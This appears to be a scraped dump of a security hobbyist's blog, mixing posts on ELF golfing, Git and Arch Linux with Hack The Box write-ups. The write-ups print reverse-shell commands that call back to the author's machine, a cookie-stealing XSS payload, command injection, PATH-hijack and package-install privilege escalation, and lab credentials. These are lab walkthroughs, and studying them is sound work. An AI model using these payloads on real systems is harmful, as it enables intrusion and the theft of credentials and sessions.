; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $-ehdr phdr: ; Elf32_Phdr dd 1 ; p_type dd 0 ; p_offset dd $$ ; p_vaddr dd $$ ; p_paddr dd filesize ; p_filesz dd filesize ; p_memsz dd 5 ; p_flags dd 0x1000 ; p_align phdrsize equ $-phdr _start: ; your program here filesize equ $-$$ And the version for 64 bits (taken from here):\nbits 64 org 0x8000000 ehdr: ; Elf64_Ehdr db 0x7F, \u0026#34;ELF\u0026#34;, 2, 1, 1, 0 ; e_ident times 8 db 0 dw 2 ; e_type dw 62 ; e_machine dd 1 ; e_version dq _start ; e_entry dq phdr - $$ ; e_phoff dq 0 ; e_shoff dd 0 ; e_flags dw ehdrsize ; e_ehsize dw phdrsize ; e_phentsize dw 1 ; e_phnum dw 0 ; e_shentsize dw 0 ; e_shnum dw 0 ; e_shstrndx ehdrsize equ $-ehdr phdr: ; Elf64_Phdr dd 1 ; p_type dd 5 ; p_flags dq 0 ; p_offset dq $$ ; p_vaddr dq $$ ; p_paddr dq filesize ; p_filesz dq filesize ; p_memsz dq 0x1000 ; p_align phdrsize equ $-phdr _start: ; your code here filesize equ $-$$ Unethical stuff # Declaring variables in the wild # 🙈 Nothing forbidens to declare variables anywhere, to save some space you can skip using the .rodata section.\nsection .text var: db \u0026#34;salut\u0026#34;, 0xa Use header as code section # 🧠 Big brain move here: put code in the header\nehdr: db 0x7f, \u0026#34;ELF\u0026#34; db 1, 1, 1, 0, 0 _start: mov bl, 42 xor eax, eax inc eax int 0x80 ;; continue the header dw 2 dw 3 dw 1 ;; ... Golfing resources # A while ago I created a repo containing some random assembly programs I did, I added my try to make a tiny Hello world binary: https://github.com/OxNinja/nasm_/tree/main/elf-golfing\nhttps://codegolf.stackexchange.com/questions/5696/shortest-elf-for-hello-world-n\nCreate tiny ELF for Linux\nhttps://www.muppetlabs.com/~breadbox/software/tiny/\nAnalyzing ELF with malformed headers\n","date":"15 April 2022","permalink":"/posts/binary-golf/","section":"Posts","summary":"So tmp.","title":"🏌️ Binary golfing - Introduction"},{"content":"To make things short, I saw How to write a virtual machine in order to hide your viruses and break your brain forever by @s01den published in tmp.out\u0026rsquo;s second edition. This new paper made me enjoy (once again) low-level. I wanted to know more about this abstract subject of \u0026ldquo;virtual machines\u0026rdquo; in reverse engineering, so I read it and started to implement my own VM in assembly!\nYou will find my code on my Github repo\nWhy assembly? # I wanted to understand everything I did during this process, and needed to stick with the lowest level I could, I will talk about the future of this project at the end of the post.\nI was also already familiar with assembly, especially nasm for Linux, and wanted to test my knowledge.\nDesign # Before staring to type very fast on my keyboard, I needed to put things on a paper, in order to have a clear overview of the project.\nI had to answer a few questions:\nWhat is an instruction?\nIt\u0026rsquo;s like a function, or an alias to some code to execute\nHow does the CPU knows what to do with an instruction?\nThe code an instruction represents is written for the CPU, so it is seamless\nHow can I make custom instructions?\nJust implemet some functions or code blocks, then map them to a custom \u0026ldquo;OPcode\u0026rdquo;\nHow can I make the CPU execute my custom instructions?\nMake a simple condition on the custom OPcode, and execute the code mapped to it\nPoC # Registers # To (re)set registers, code is very straightforward and don\u0026rsquo;t really need explainations, right?\nreset_registers: push rbp mov rbp, rsp xor rax, rax xor rbx, rbx xor rcx, rcx xor rdx, rdx xor r8, r8 leave ret Instructions # I decided to implement a very low amount of instructions, as I already plan to upgrade this project in the future. I only need a proof of concept before going big.\nOPcode Instruction NASM 0x1 mov a, b mov rbx, rcx 0x2 push a push rbx 0x3 add a, b add rbx, rcx 0x4 jmp a jmp rbx Yes, some very basic instructions.\nExecution # The concept here is to compare rax, our opcode register and then call the corresponding function:\n;; if opcode == 0x1: ;; mov_a_b() cmp rax, 0x1 je mov_a_b cmp rax, 0x2 je push_a cmp rax, 0x3 je add_a_b ;; and so on with every opcode call _exit ;; default if unrecognized opcode Future # In a future post I will cover how to improve this VM, especially using a fully emulated virtual memory, using C. 😎\n","date":"17 March 2022","permalink":"/posts/assembly-vm/","section":"Posts","summary":"The first part of my series on low-level learning journey, sit back, relax and enjoy me struggling for basic stuff.","title":"🔎 Creating a VM for fun - Part 1: ASM"},{"content":" Git 🔥 # You want to use Git as a real chad developper? Let\u0026rsquo;s go - f a s t - then.\nBasics # Git is a decentralized versioning tool aimimg to help programmers following source code development.\nTrack file changes Update remote code Work simultaneously with a lot of people Arrange your code organization Resources:\nhttps://www.freecodecamp.org/news/learn-the-basics-of-git-in-under-10-minutes-da548267cc91/ https://rogerdudler.github.io/git-guide/ https://lab.github.com/lmachens/git-and-github-first-timers Create a new project # From scratch # git init From an empty repository # git clone https://myrepo.org/project-0 # or with ssh (use your public key) git clone git@myrepo.org:username/project-0 Do some modifications # \u0026quot;In your favorite editor\u0026quot;. Next line: vim 🤣 pic.twitter.com/vw7cqCOFFL\n\u0026mdash; Baptiste Robert (@fs0c131y) April 28, 2021 vim my_file.txt # haha 🤣 lol my favorite editor # add the file to the repository git add my_file.txt # change the name of the file git mv my_file.txt README.md # delete a file git rm README.md # commit your changes git commit -m \u0026#39;My changes\u0026#39; # update the repository git push # if from scratch git remote add origin git@myrepo.org:username/project-0 git push -u origin master Update your repository # git pull Advanced mechanics # # create new branch and push it to repo git checkout -b my-branch vim ...; git add ...; git commit ... git push -u origin my-branch # tag a commit git tag -a v1.0 -m \u0026#34;My description of the tag\u0026#34; # merge my-branch into master git checkout master git merge my-branch git push # update your submodules git submodule update --remote --merge # delete a local commit git reset HEAD~ # modify a local commit git commit --amend # temporary discard your local changes git stash # config your git variables git config user.name PouetPouet # sign off a commit # some opensource project require you to sign your commits, see # https://stackoverflow.com/a/1962112 git commit -s -m \u0026#34;My commit message\u0026#34; # mutli authors git commit -m \u0026#34;My commit message You can add co-authors to a commit by adding one line by author like so: (note the mandatory 2 empty lines) Co-authored-by: username \u0026lt;user@example.com\u0026gt;\u0026#34; For more tricks: ohshitgit.com\n","date":"17 October 2021","permalink":"/posts/tldr-git/","section":"Posts","summary":"You want to know how to use Git as a chad developper?","title":"🚀 TL;DR - Git"},{"content":"","date":"17 October 2021","permalink":"/tags/dev/","section":"Tags","summary":"","title":"dev"},{"content":"","date":"17 October 2021","permalink":"/tags/git/","section":"Tags","summary":"","title":"git"},{"content":"","date":"17 October 2021","permalink":"/categories/tldr/","section":"Categories","summary":"","title":"TL;DR"},{"content":"","date":"17 October 2021","permalink":"/tags/tldr/","section":"Tags","summary":"","title":"tldr"},{"content":"","date":"2 October 2021","permalink":"/tags/diy/","section":"Tags","summary":"","title":"diy"},{"content":"","date":"2 October 2021","permalink":"/tags/hardware/","section":"Tags","summary":"","title":"hardware"},{"content":" Why? # Why not?\nComponents # I bought all the parts on kbdfans.com, but you can find a lot of things on other websites. Be careful on the shipping tho!\nPart Product Comment Switches Gateron red linear, x70 Stabilizers Cherry Screw-in Stabs 60 set PCB KBD67 rev2 65% PCB RGB, VIA support, USB-C Plate Aluminium plate Backplate TADA68 Low Profile Aluminum Case Keycaps Generic caps Lube PCMasterrace lube Tip: buy a lube station and a switch disassembler for more confort\nSwitches # First thing to do is to disassemble the switches and separate all the pieces for lubing.\nRef:\nTest the PCB # We want to test our PCB if any pin is damaged or not working, I used the VIA software to check it.\nStabilzers # Trim the useless feet of the stabilizers for better stability and less noise.\nBefore After Now we will lube the stabs and place them on the PCB.\nRef:\nSoldering # We now want to solder the switches to the PCB.\nRef:\nFinish # Put the keycaps on it and you got your brand new handmade keyboard.\nSound testing # Sorry for bad quality\nKeyboard Sound Ducky One 2 (MX brown) mp3 Keychron k3 (MX brown lubed) mp3 Mine (Gatheron red lubed) mp3 Configure keyboard with VIA # VIA is an open source software to help you configure your keyboard: adding layers (like Fn key), macros and so on.\nI used it in order to add a function on my right control key, to unlock a new layer on the keyboard, I can now use F1-F10 keys easily.\n","date":"2 October 2021","permalink":"/posts/build-your-own-keyboard/","section":"Posts","summary":"A simple and quick summary on how to build a mechnical keyboard on your own from scratch.","title":"🪛 Build your own mechanical keyboard"},{"content":"","date":"1 September 2021","permalink":"/tags/notes/","section":"Tags","summary":"","title":"notes"},{"content":"","date":"1 September 2021","permalink":"/tags/pwn/","section":"Tags","summary":"","title":"pwn"},{"content":"","date":"1 September 2021","permalink":"/tags/writeup/","section":"Tags","summary":"","title":"writeup"},{"content":" There are a lot of high quality articles about pwn, but I want to share my experience and thus find my mistakes and complete my knowledge. Enjoy.\n🔧 work in progress\npwn? # Refering to the \u0026lsquo;binary exploitation\u0026rsquo; category, pwn is about exploiting weaknesses in low-level and bad code issues. For exemple corrupting the memory if a program does not sanitise the user input.\nI did a walkthrough of a pwn lab a few years ago, I found it cool and wanted to share my experience in this post.\n","date":"1 September 2021","permalink":"/posts/start-pwn/","section":"Posts","summary":"So you want to start to pwn, don\u0026rsquo;t you? Well, I did too! Those are my notes on the past year of binary exploitation.","title":"You want to start to pwn?"},{"content":"","date":"18 August 2021","permalink":"/tags/archlinux/","section":"Tags","summary":"","title":"archlinux"},{"content":" ⚠️ Now Archlinux embeeds an install script which you can run with archinstall, this blog post is here for curious people wanting to know how to install things from scratch and know how a Linux system works.\nI recently installed Archlinux on my laptop, let me help you for a fresh new install, step by step, with all commands and tips I learnt.\nAfter closing around 30-40 navigation pages on my phone after every new installation, I decided to take notes of my mistakes and the tips I learnt of my past experiences in this post.\nDisclaimer: I based all my previous installations on the following, therefor some content will be very similar, if not the same.\nhttps://archlinux.org/ https://wiki.archlinux.fr/installation https://github.com/FredBezies/arch-tuto-installation/blob/master/install.md (🇫🇷) https://driikolu.fr/2020/03/install_arch_chiffre_uefi/ (🇫🇷) I recommend to read the tips if you have an issue with something (Ctrl-f should work), or want to learn a bit more.\nArchlinux # I really love the minimalist mindset of Archlinux: install only what you need and what you want. You need to change something in particular? You know how to do it because you learnt how to install it before.\nYou are in total control of your installation and can customize it as needed. Without mentioning the AUR packages.\nBootable USB # The first thing to get is a USB stick to make it bootable and store the ISO on it.\nsudo dd bs=4M if=/path/to/archlinux.iso of=/dev/sdX # sdX is your USB stick (see lsblk) After some time, you get your USB bootable. Boot your computer on it to install Archlinux.\n⚠️ I have an Nvidia graphics card (too recent to be supported) and needed to add the nomodeset flag on boot because of screen glitches.\nBase system # Partitions # We first want to create our partitions. Make sure to get your disk label with fdisk -l.\nWe will create 4 partitions:\nPartition Name Type Size Mount point /dev/sdX1 EFI FAT32 128MiB /mnt/boot/efi /dev/sdX2 Boot ext4 256MiB /mnt/boot /dev/sdX3 Root ext4 32GiB /mnt /dev/sdX4 Home ext4 Everything else /mnt/home Those values are arbitrary, change them at your own risks.\n# partitions parted /dev/sdX mklabel gpt # EFI mkpart primary fat32 1MiB 129MiB # 128MiB size set 1 esp on # Boot mkpart primary ext4 129MiB 385MiB # 256MiB size set 2 boot on # Root mkpart primary ext4 385MiB 32.4GiB # 32GiB size # Home mkpart primary ext4 32.4GiB 100% # take everything else q Create filesystem on the partitions:\nmkfs.fat -F32 /dev/sdX1 for i in {2..4}; do mkfs.ext4 /dev/sdX$i; done # oneliner # or mkfs.ext4 /dev/sdX2 mkfs.ext4 /dev/sdX3 mkfs.ext4 /dev/sdX4 Basic configuration # You want now to set your NTP:\ntimedatectl set-timezone Europe/Paris # change to your location timedatectl set-ntp true Linux setup # Basic install\nWe will now mount our partitions on the system and install basic packages on it.\nmount /dev/sdX3 /mnt mkdir /mnt/home; mount /dev/sdX4 /mnt/home mkdir /mnt/boot; mount /dev/sdX2 /mnt/boot mkdir /mnt/boot/efi; mount /dev/sdX1 /mnt/boot/efi Reffer to the partitions table\nLet\u0026rsquo;s install basic packages using pacstrap:\npacstrap /mnt base base-devel linux linux-firmware If your ISO is old, you will have to update your keyring because some PGP signatures could be missing/expired.\nYou will want to add nvidia if you have such card. Or even your favourite text editor.\nWe can now generate our fstab:\ngenfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab ⚠️ Do not forget to install dhclient if you want Internet access after reboot\nConfiguration\nWe can now edit our configuration:\nvi /etc/hostname # My-Super-Machine vi /etc/hosts # 127.0.0.1 My-Super-Machine.my-local-domain My-Super-Machine # NTP setup ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc Set your locales:\nvi /etc/locale.gen # uncomment your locale locale-gen vi /etc/locale.conf # Use your own # LANG=\u0026#34;en_US.UTF-8\u0026#34; We can now set a password for the root account:\npasswd Boot setup # Let\u0026rsquo;s install Grub for the boot manager:\npacman -S grub efibootmgr Setup the kernel modules and install Grub on the system:\narch-chroot /mnt mkinitcpio -p linux grub-install --target=x86_64-efi --efi-directory=/boot/efi --recheck /dev/sdX grub-mkconfig -o /boot/grub/grub.cfg Your system is now ready to work. Congratulations, you can now reboot the machine and unplug the USB stick!\nSudoer user # We do not want to use root user, we create a sudo user:\nuseradd --create-home user_name passwd user_name usermod --append --groups wheel user_name visudo # uncomment %wheel ALL=(ALL) ALL Users in wheel group will be sudoer (using their password).\nGraphical environment # You may now need to use a graphical environment, I will show how to use the famous i3 and setup a basic status bar: polybar.\nInstall xorg if not installed yet\nI will from now, exec commands as a regular user. sudo -u user_name.\ni3 # sudo pacman -S i3-wm And voilà, i3 is now installed. It will start on next login, we will see for a connection manager in a moment.\npolybar # You want a status bar? Polybar provide fast, easy to customize bars.\n# not available on pacman repos, so build from source cd ~/.local/share git clone https://aur.archlinux.org/polybar cd polybar; makepkg -isc Once installed you can find cool themes at https://github.com/adi1090x/polybar-themes you will find installation and setup instructions on the repo.\nYou can add an entry for the bar to launch on login in your i3 config:\nvim ~/.config/i3/config # exec_always --no-startup-id ~/.config/polybar/launch.sh --your-selected-theme rofi # I use rofi for my application launcher and power menu, see https://github.com/adi1090x/rofi for more info.\nAdd a system bind on your config:\nvim ~/.config/i3/config # bindsym $mod+d exec ~/.config/rofi/launchers/launcher_you_want/launcher.sh lightdm # As its name says, lightdm is a lightweight package, it will allow you to setup your login page on startup.\nDon\u0026rsquo;t forget to enable it with sysytemd: systemctl enable lightdm.\nPost-installation troubleshouting # BIOS update broke my setup # Yeah it appears that on a BIOS update, you can break your grub config. It happened to me every time as I run a dual boot alongside W*ndows. Jokes apart, it is very easy to fix things.\nThe main issue encountered is the disapearance of Grub and so, your Arch partition. Fear not, you can fix it in only 2 steps:\nFind your bootable stick and boot on it Follow the steps: # mount your partitions mount /dev/sdX3 /mnt; mount /dev/sdX4 /mnt/home; mount /dev/sdX2 /mnt/boot; mount /dev/sdX1 /mnt/boot/efi # regenerate your fstab genfstab -U /mnt \u0026gt;\u0026gt; /mnt/etc/fstab # reinstall grub arch-chroot /mnt mkinitcpio -p linux grub-install --target=x86_64-efi --efi-directory=/boot/efi --recheck grub-mkconfig -o /boot/grub/grub.cfg And you can reboot.\nDual boot with windows # My grub did not detect my Windows partition, this post helped me to solve the issue.\nTips # Something is broken? You forgot to install an important package but already completed all the steps? Do not reinstall from scratch! Just boot on your USB, mount your system back and chroot into it! If using Nvidia card, set nomodeset on boot if screen tearing/glitch Make sure to have some space for the root partition, even 32GB is tight sometimes Update your pacman\u0026rsquo;s keyring if the ISO is old with pacman-key --populate archlinux Make sure to install dhclient and a network manager to access the Internet Disable the computer speaker BEEP: echo blacklist pcspkr \u0026gt; /etc/modprobe.d/nobeep.conf If you find something broken here, feel free to send an issue on the Github repo.\nAs I am in some distro reinstallation process, I will update this notes on the fly.\n","date":"18 August 2021","permalink":"/posts/install-archlinux/","section":"Posts","summary":"I recently installed once again Archlinux on a laptop. Let me explain how to do so.","title":"How to install Archlinux"},{"content":"","date":"18 August 2021","permalink":"/tags/tutorial/","section":"Tags","summary":"","title":"tutorial"},{"content":" TL;DR # Bypass PHP redirect to access restricted page, create low priv web account, get website backup. Audit code and find OS command injection + MySQL creds, get reverse shell and dump database, get password hash and crack it to SSH. Privesc via path injection.\nFootholds # nmap gives us only ports 22 and 80.\nWe first get this website:\nNothing we can deal with here, no SQL injection :(\nFor more info I used dirsearch to fuzz the web pages, and it found the following:\n/accounts.php /download.php /files.php /login.php /logout.php /logs.php /status.php User # All with 302 Found HTTP code, with a redirect towards /login.php. With that much info we want to get the content of those pages. To do so I used BurpSuite and made a filter to replace HTTP/1.1 302 Found with HTTP/1.1 200 which worked like a charm, but using only curl would also work.\nWe now have access to the previous pages. In order to download a file you must have a valid PHPSESSID, so you want to create your own user on /accounts.php. Log in again with your fresh accounts and you can access to the siteBacku.zip file at /files.php.\nIn this backup we have multiple files, including a nice config.php containing MySQL credentials; we will use it in a minute. We also have the code for the whole webapp. One file caught my attention:\n// logs.php [...] ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(\u0026#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[\u0026#39;delim\u0026#39;]}\u0026#34;); echo $output; [...] Whatever this means, there is no filter at all for this $_POST['delim'] variable, therefor we can easily inject some command here. As confidant as always I open a netcat listener on my machine, and inject my payload like so:\ncurl -X POST previse.htb/logs.php -b \u0026#39;PHPSESSID=MY_VALID_SESSION\u0026#39; -d \u0026#39;delim=;nc IP PORT -e /bin/sh\u0026#39; As expected I got my reverse shell 🎉\nLet\u0026rsquo;s upgrade from this poor virgin netcat to a chad upgrade:\n# on reverse shell python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; (www-data@previse.htb) /var/www/html/: ^Z # Ctrl-Z to background # on main host ~/ctf/htb/previse \u0026gt; stty raw -echo; fg (www-data@previse.htb) /var/www/html/: We now have a better shell, with history and completion. Time to get user!\nWith the previous info we can directly dump the database:\nmysql -u root -p \u0026#39;mySQL_p@ssw0rd!:)\u0026#39; -D previse -e \u0026#39;select * from accounts;\u0026#39; Like so we get a password hash for an another user: m4lwhere:$1$🧂llol$DQpmdvnb7EeuO6UaqRItf., we crack it using hashcat because john did not worked:\nhashcat -m 500 user_hash /usr/share/wordlist/rockyou.txt # wait for about 15 minutes... $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! We can SSH on the box.\nRoot # (m4lwhere@previse.htb): sudo -l (root) /opt/scripts/access_backups.sh # /opt/scripts/access_backup.sh gzip -c /var/www/apache_logs.gz ... The path for the access_backup.sh is absolute, but not for gzip in the script. We can then create our own gzip executable which will run with root rights:\n# /tmp/gzip #!/bin/sh cat /root/root.txt \u0026gt; /tmp/root We change our path with export PATH=\u0026quot;/tmp/:$PATH\u0026quot; and execute the script with sudo:\ncd /tmp; sudo /opt/scripts/access_logs.sh\n","date":"11 August 2021","permalink":"/posts/htb-previse/","section":"Posts","summary":"TL;DR # Bypass PHP redirect to access restricted page, create low priv web account, get website backup.","title":"📦 HTB - Previse"},{"content":"","date":"11 August 2021","permalink":"/tags/htb/","section":"Tags","summary":"","title":"htb"},{"content":"","date":"11 August 2021","permalink":"/categories/htb/","section":"Categories","summary":"","title":"HTB"},{"content":" Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.\nTL;DR # XSS to steal Moodle creds of teacher, privesc as manager and then RCE. Get MySQL in config file, dump users and get password hash. Break the hash with john to ssh as user. Common pkg install exploit for root.\nFootholds # # Nmap 7.91 scan initiated Mon Aug 2 22:40:05 2021 as: nmap -A -p- -T4 -o nmap.out schooled.htb Nmap scan report for schooled.htb (10.10.10.234) Host is up (0.082s latency). Not shown: 65532 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0) | ssh-hostkey: | 2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA) | 256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA) |_ 256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519) 80/tcp open http Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15 |_http-title: Schooled - A new kind of educational institute 33060/tcp open mysqlx? | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: | Invalid message\u0026#34; | HY000 | LDAPBindReq: | *Parse error unserializing protobuf message\u0026#34; | HY000 | oracle-tns: | Invalid message-frame.\u0026#34; |_ HY000 ... The website we have seems to be static, no JavaScript to exploit, not so much to do 🤔\nAfter a while I read that they are talking about a Moodle on this site. So I decided to find it, moodle.schooled.htb!\nEntrypoint # XSS you say? # Found the version by visiting some forbidden page for my user: Moodle 3.9.\nWe got those email domains: student.schooled.htb \u0026amp; staff.schooled.htb.\nLooking for exploits for this version, I found an XSS payload for MoodleNet in user profile. By chance, a teacher (maths class) is looking for enroled students\u0026rsquo; MoodleNet profiles.\nMoodleNet: \u0026lt;script\u0026gt;new Image().src=\u0026quot;http://your-ip:port/\u0026quot; + document.cookie\u0026lt;/script\u0026gt; python3 -m http.server port\nSee here for more details about the XSS.\nBy starting an HTTP server on our machine, we get the teacher\u0026rsquo;s session cookie.\nGet manager access # After some research on this Moodle version, I found a good exploit to use: https://github.com/lanzt/CVE-2020-14321.\nNo need to fix this exploit, even if this is not the original exploit script for this CVE, I used it because it was the first to show in the search engine.\npython3 cve.py http://moodle.schooled.htb/moodle -c \u0026#34;whoami\u0026#34; --cookie TEACHER_COOKIE [...] www As this box was FreeBSD, nc does not work the same, we need a bigger payload for a reverse shell:\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc IP PORT \u0026gt;/tmp/f\nSo my command to get a reverse shell:\npython3 cve.py http://moodle.schooled.htb/moodle -c \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc IP PORT \u0026gt;/tmp/f\u0026#34; --cookie TEACHER_COOKIE On another terminal:\nnc -nlvp PORT $ whoami www $ We have now a reverse shell! Let\u0026rsquo;s get user.\nUser # List user directories:\n$ ls /home /home/steve /home/jamie By looking in the moodle\u0026rsquo;s directory we get this config file:\n\u0026lt;?php // Moodle configuration file unset($CFG); global $CFG; $CFG = new stdClass(); $CFG-\u0026gt;dbtype = \u0026#39;mysqli\u0026#39;; $CFG-\u0026gt;dblibrary = \u0026#39;native\u0026#39;; $CFG-\u0026gt;dbhost = \u0026#39;localhost\u0026#39;; $CFG-\u0026gt;dbname = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbuser = \u0026#39;moodle\u0026#39;; $CFG-\u0026gt;dbpass = \u0026#39;PlaybookMaster2020\u0026#39;; $CFG-\u0026gt;prefix = \u0026#39;mdl_\u0026#39;; $CFG-\u0026gt;dboptions = array ( \u0026#39;dbpersist\u0026#39; =\u0026gt; 0, \u0026#39;dbport\u0026#39; =\u0026gt; 3306, \u0026#39;dbsocket\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;dbcollation\u0026#39; =\u0026gt; \u0026#39;utf8_unicode_ci\u0026#39;, ); $CFG-\u0026gt;wwwroot = \u0026#39;http://moodle.schooled.htb/moodle\u0026#39;; $CFG-\u0026gt;dataroot = \u0026#39;/usr/local/www/apache24/moodledata\u0026#39;; $CFG-\u0026gt;admin = \u0026#39;admin\u0026#39;; $CFG-\u0026gt;directorypermissions = 0777; require_once(__DIR__ . \u0026#39;/lib/setup.php\u0026#39;); // There is no php closing tag in this file, // it is intentional because it prevents trailing whitespace problems! We have now MySQL creds, let\u0026rsquo;s use them:\n/usr/local/bin/mysql -umoodle -p Password: Weird\u0026hellip; We should get a shell here.\nIn fact the exploit we use is not meant to nest child shells. For example we can\u0026rsquo;t just bash to get a bash shell, we must stay in our shell.\nFortunaletly we can execute commands using MySQL\u0026rsquo;s binary:\n/usr/local/bin/mysql -umoodle -pPlaybookMaster2020 -D moodle -e \u0026#34;show tables;\u0026#34; We dump the users:\nselect * from mdl_user; The interesting line here is:\nadmin $2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW Jamie Borham jamie@staff.schooled.htb We need to crack this hash. Let\u0026rsquo;s use john:\nWe can SSH with this.\nRoot # Classic:\nsudo -l (NOPASSWD) /usr/sbin/pkg update (NOPASSWD) /usr/sbin/pkg install * Using this https://gtfobins.github.io/gtfobins/pkg/ we build our package to RCE as root:\n# local echo \u0026#39;cat /root/root.txt\u0026#39; \u0026gt; a.sh fpm -n x -s dir -t freebsd -a all --before-install a.sh . scp x-1.0.txz jamie@schooled.htb:/tmp # ssh sudo /usr/sbin/pkg install -y --no-repo-update /tmp/x-1.0.txz ... /root/root.txt hash here ","date":"4 August 2021","permalink":"/posts/htb-schooled/","section":"Posts","summary":"Cool box, not too CTF-like and real-life applicable, my first FreeBSD 😄 But root part was too quick.","title":"📦 HTB - Schooled"},{"content":" ⚠️ writeup wrote months after root so informations are not accurate.\nTL;DR # JS source code disclosure to forge internal requests, leak PHP source code with XXE in custom request, get DB credentials. Privesc with code injection in custom code without input validation.\nRecon # Only HTTP and SSH, nothing special.\nFootholds # We have here a simple web server, with custom SJ script to send bounty tickets. The portal tells us to go to /log_submit.php, here we have a custom XHR launched towards an internal API dirb_pr00f314.php. We see that XML is posted here so lets try a classic XXE:\nWe can leak source code with this, here are the files I got: db.php.\nWe get credentials:\n\u0026lt;?php // TODO -\u0026gt; Implement login system with the database. $dbserver = \u0026#34;localhost\u0026#34;; $dbname = \u0026#34;bounty\u0026#34;; $dbusername = \u0026#34;admin\u0026#34;; $dbpassword = \u0026#34;m19RoAU0hP41A1sTsq6K\u0026#34;; $testuser = \u0026#34;test\u0026#34;; ?\u0026gt; With leaking /etc/passwd we got our target, the user developement. We can SSH eith the $dbpassword.\nPrivesc # Basic sudo -l:\nFrom that we have a local script to validate tickets: ticketValidator.py.\nHere we see an obvious code injection vulnerability in a custom ticket:\nWe cat get root:\n","date":"29 July 2021","permalink":"/posts/htb-bountyhunter/","section":"Posts","summary":"⚠️ writeup wrote months after root so informations are not accurate.","title":"📦 HTB - BountyHunter"},{"content":" Pretty interesting box, first time seeing Android in HTB.\nTL;DR # Exfilter files on device using ES File explorer exploit, get user credentials. Root is straightforward with ADB.\nFootholds # With nmap we get the following:\n# Nmap 7.91 scan initiated Wed Jul 28 14:49:28 2021 as: nmap -A -p- -o nmap.out explore.htb Nmap scan report for explore.htb (10.10.10.247) Host is up (0.043s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 33195/tcp open unknown [...] 2222: SSH server 5555: not interesting, we will see why further 33195: ES File Explorer (with some research) The only useful port here is 33195, with a litle research on the web we get that this is possibly a good entrypoint for our exploit.\nUser # As this is an easy box and I am lazy I used the forbidden M e t a s p l o i t. Using it\u0026rsquo;s auxiliary/scanner/es_file_explorer_open_port exploit I managed to exfilter some files off the device:\nWe found some Pictures on the device. The creds.jpg is very interesting:\nWe can now ssh to the device and get user.txt.\nRoot # The idea that came to my mind here was to use ADB to get a root shell on the device. We first need to connect to this device with ADB, so we have to make a tunnel:\nssh -p 2222 user@explore.htb -L 5555:localhost:5555 We can now connect to it:\nadb connect localhost:5555 adb root adb shell End of the box.\n","date":"29 July 2021","permalink":"/posts/htb-explore/","section":"Posts","summary":"Pretty interesting box, first time seeing Android in HTB.","title":"📦 HTB - Explore"},{"content":" Simple easy box, perfect to warmup before the FIC 2021 and get more confidence in 1337 h4ck1n9\nTL;DR # Find PCAP file on server, get SSH credentials, execute code as root with Python.\nFootholds # I did not even use nmap here, as we had a web server serving on port tcp:80. This website looked like this:\nIt seems to be a security dashboard for a server, we don\u0026rsquo;t have any info about that. We have multiple endpoints on the server :\n/capture: redirects to /data/{id} after loading /data/{id}: we can download {id}.pcap by clicking a button /ip: get a netstat output What can we do with that?\nUser # I got to download the file 11.pcap, and got nothing in it. I recognized that all my interactions with the server were logged in this PCAP, which is odd, I tought the server was serving a particular PCAP.\nAfter playing again with the /capture endpoint, I figured out that the /data/{id} correspond to a specific user or IP. So I checked /data/0 and got the following data:\nAnd guess what? Yes we can see credentials in cleartext here:\nSo we can SSH to the machine with those.\nRoot # Source code # The server was running in /var/www/html/app.py which is a Flask server. the user nathan have rw rights on it so I checked the source code:\nimport os from flask import * from flask_limiter import Limiter from flask_limiter.util import get_remote_address import tempfile import dpkt from werkzeug.utils import append_slash_redirect # [...] app = Flask(__name__) @app.route(\u0026#34;/\u0026#34;) def index(): return render_template(\u0026#34;index.html\u0026#34;) @app.route(\u0026#34;/capture\u0026#34;) @limiter.limit(\u0026#34;10 per minute\u0026#34;) def capture(): path = os.path.join(app.root_path, \u0026#34;upload\u0026#34;, str(pcapid) + \u0026#34;.pcap\u0026#34;) ip = request.remote_addr # permissions issues with gunicorn and threads. hacky solution for now. #os.setuid(0) #command = f\u0026#34;timeout 5 tcpdump -w {path} -i any host {ip}\u0026#34; command = f\u0026#34;\u0026#34;\u0026#34;python3 -c \u0026#39;import os; os.setuid(0); os.system(\u0026#34;timeout 5 tcpdump -w {path} -i any host {ip}\u0026#34;)\u0026#39;\u0026#34;\u0026#34;\u0026#34; os.system(command) #os.setuid(1000) return redirect(\u0026#34;/data/\u0026#34; + str(pcapid)) @app.route(\u0026#34;/ip\u0026#34;) def ifconfig(): d = os.popen(\u0026#34;ifconfig\u0026#34;).read().strip() print(d) return 